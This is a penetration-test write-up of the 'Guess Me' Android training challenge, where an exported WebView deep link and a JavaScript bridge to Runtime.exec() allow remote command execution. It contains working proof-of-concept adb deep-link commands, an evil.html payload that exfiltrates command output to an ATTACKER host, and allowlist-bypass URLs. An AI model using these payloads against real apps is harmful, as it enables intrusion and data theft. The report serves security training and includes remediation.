# Mobile App Pentest — `com.mobilehackinglab.guessme`

**Target:** `com.mobilehackinglab.guessme.apk` (Mobile Hacking Lab "Guess Me" training challenge)
**Platform:** Android (minSdk 24, targetSdk 34)
**Basis:** CTF / lab / training
**Date:** 2026-10-30
**Verification:** GM-01 **dynamically confirmed** on an Android emulator (see evidence below). Remaining findings verified by static analysis.

---

## Summary

The app ships a **remotely reachable command-execution chain**. An exported, `BROWSABLE` WebView activity accepts a deep link, loads an attacker-chosen URL into a WebView that has JavaScript enabled and a `@JavascriptInterface` bridge wired directly to `Runtime.exec()`. The deep-link "allowlist" is a trivially bypassable `endsWith()` string check. Net result: **a web page or another app can run OS commands in the app's sandbox** (MASVS-PLATFORM / MASVS-CODE). Several device-posture weaknesses (`debuggable`, `allowBackup`, cleartext traffic) compound it.

| ID | Finding | Severity | MASVS |
|----|---------|----------|-------|
| GM-01 | RCE: exported WebView deep link → JS bridge → `Runtime.exec()` | **Critical** | MASVS-PLATFORM-2 / MASVS-CODE-4 |
| GM-02 | Weak deep-link validation (`endsWith` allowlist bypass) | High | MASVS-PLATFORM-3 |
| GM-03 | `addJavascriptInterface` exposes native command execution to web content | High | MASVS-PLATFORM-2 |
| GM-04 | `android:debuggable="true"` in shipped APK | Medium | MASVS-RESILIENCE-1 |
| GM-05 | `android:allowBackup="true"` (full backup, data extractable) | Medium | MASVS-STORAGE-2 |
| GM-06 | Cleartext traffic permitted (`cleartextTrafficPermitted="true"`) | Low | MASVS-NETWORK-1 |

---

## GM-01 — Remote Code Execution via exported WebView deep link (Critical)

**Chain:**

1. `WebviewActivity` is `exported="true"` with a `BROWSABLE` intent filter for scheme `mhl` / `https` and host `mobilehackinglab` — reachable from any app or from a browser link, no permissions required.
2. `handleDeepLink()` → `loadDeepLink()` loads the deep link's `url` query parameter straight into the WebView: `webView.loadUrl(fullUrl)`.
3. The WebView has `setJavaScriptEnabled(true)` and `addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge")`.
4. `MyJavaScriptInterface.getTime(x)` executes `x` via `Runtime.getRuntime().exec(...)` and returns stdout to JavaScript.

**Sink** (`MyJavaScriptInterface`, `classes3.dex`):
```java
@JavascriptInterface
public final String getTime(String time) {
    Process process = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", time});
    // ... returns stdout to the caller (JavaScript)
}
```
> Note: the APK contains two variants of this interface — a top-level one using `sh -c <input>` (full shell) and a nested `WebviewActivity$MyJavaScriptInterface` using `exec(<input>)` (whitespace-split, no shell). Both pass fully attacker-controlled input to `Runtime.exec`, so both are RCE; only shell-metacharacter handling differs.

**Entry (`WebviewActivity`):**
```java
webSettings.setJavaScriptEnabled(true);
webView.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge");
...
String fullUrl = String.valueOf(uri.getQueryParameter("url"));
webView.loadUrl(fullUrl);   // attacker-controlled
```

**Impact:** Arbitrary OS command execution inside `com.mobilehackinglab.guessme`'s sandbox — read/write app-private files, exfiltrate data over the already-granted INTERNET permission, abuse any of the app's permissions. Triggerable remotely (victim clicks a link) or by any malicious app on the device.

### Proof of Concept

**Option A — self-contained `data:` URL (no server needed).** The `url` param only has to *end with* `mobilehackinglab.com` (see GM-02); put that literal in an HTML comment:
```bash
adb shell am start -a android.intent.action.VIEW \
  -d 'mhl://mobilehackinglab?url=data:text/html,<script>document.title=AndroidBridge.getTime("id")</script><!--mobilehackinglab.com-->' \
  com.mobilehackinglab.guessme
```

**Option B — hosted page (most reliable; cleartext is allowed).** Host `evil.html`:
```html
<script>
  // runs in the app's sandbox; result available to the page
  var out = AndroidBridge.getTime("id; getprop ro.product.model; ls -la /data/data/com.mobilehackinglab.guessme");
  fetch("http://ATTACKER:8000/exfil?d=" + encodeURIComponent(out)); // exfil over INTERNET perm
</script>
<!-- mobilehackinglab.com -->
```
Deliver via deep link (ending in the allowlisted string so validation passes):
```bash
adb shell am start -a android.intent.action.VIEW \
  -d 'mhl://mobilehackinglab?url=http://ATTACKER:8000/evil.html%23mobilehackinglab.com' \
  com.mobilehackinglab.guessme
```

**Expected result:** output of `id` (app uid), device model, and a directory listing of the app's private data — proving command execution.

### Confirmed result (emulator, 2026-10-30)
A minimal payload `data:text/html,<script>console.log("PX "+AndroidBridge.getTime("id"))</script>#mobilehackinglab.com`, delivered via the `mhl://mobilehackinglab?url=...` deep link, produced in logcat:
```
I chromium: [INFO:CONSOLE(1)] "PX uid=10174(u0_a174) gid=10174(u0_a174) groups=10174(u0_a174),3003(inet),9997(everybody),...
             context=u:r:untrusted_app:s0:c174,c256,c512,c768"
```
The `id` command executed in the app's sandbox (uid 10174, SELinux `untrusted_app`) with output returned to attacker-controlled JavaScript — **end-to-end RCE confirmed** through the exported deep link. (Delivered via a short `data:` URL because a long encoded argument was corrupted in transit through PowerShell/adb; the vulnerability is unaffected.)

### Remediation
- Do **not** attach a JavaScript interface that performs sensitive/native operations. If a bridge is required, expose only specific, typed, non-executing methods — never pass bridge input to `Runtime.exec`.
- Never load externally supplied URLs into a WebView that has a privileged bridge. Keep the bridge bound only while displaying trusted, local content.
- If remote content must load, use a dedicated WebView with no interface, `setAllowFileAccess(false)`, and a strict `WebViewClient` allowlist.

---

## GM-02 — Weak deep-link validation / allowlist bypass (High)

```java
private final boolean isValidDeepLink(Uri uri) {
    if ((!areEqual(uri.getScheme(), "mhl") && !areEqual(uri.getScheme(), "https"))
        || !areEqual(uri.getHost(), "mobilehackinglab")) return false;
    String q = uri.getQueryParameter("url");
    return q != null && StringsKt.endsWith(q, "mobilehackinglab.com", ...);
}
```
The only content check is that the `url` parameter **ends with** the string `mobilehackinglab.com`. Bypasses:
- Trailing fragment/query: `https://attacker.com/evil.html#mobilehackinglab.com`
- Lookalike domain: `https://evil-mobilehackinglab.com/evil.html` (string still ends with it when placed at the end)
- `data:` URL ending in `<!--mobilehackinglab.com-->`

**Remediation:** Validate the parsed URL's **host** against an exact allowlist (`uri.getHost().equals("www.mobilehackinglab.com")`), not a substring/`endsWith` on the raw string. Reject non-`https` schemes and reject `data:`/`file:`/`javascript:`.

---

## GM-03 — `addJavascriptInterface` exposes native execution (High)
Attaching `AndroidBridge` with a method that shells out means **any** page loaded in the WebView (local or remote) can invoke it. This is the sink enabling GM-01. Even without the deep link, loading any attacker-influenced content into this WebView is game over. **Remediation:** remove the exec-capable bridge entirely; see GM-01.

## GM-04 — Debuggable release build (Medium)
`android:debuggable="true"` lets anyone attach a JDWP debugger / `run-as` the app and read its private data on any device. **Remediation:** ensure `debuggable=false` in release builds (don't ship debug builds).

## GM-05 — Backups allowed (Medium)
`android:allowBackup="true"` with an empty `<full-backup-content/>` lets `adb backup` / cloud backup pull the app's private data off the device. **Remediation:** set `allowBackup="false"` or define strict backup rules excluding sensitive data.

## GM-06 — Cleartext traffic permitted (Low)
`network_config.xml` sets `cleartextTrafficPermitted="true"`, allowing plain HTTP (MITM-able) and easing GM-01's hosted-payload delivery. **Remediation:** disable cleartext; require TLS.

---

## Appendix — environment & method
- Tools: `unzip`, `jadx 1.5.0` (decompilation + manifest decode), `strings`/`grep` over the raw DEX.
- All findings derived from the decoded `AndroidManifest.xml`, decompiled `WebviewActivity`, `MyJavaScriptInterface`, `MainActivity`, `assets/index.html`, and `res/xml/*` configs.
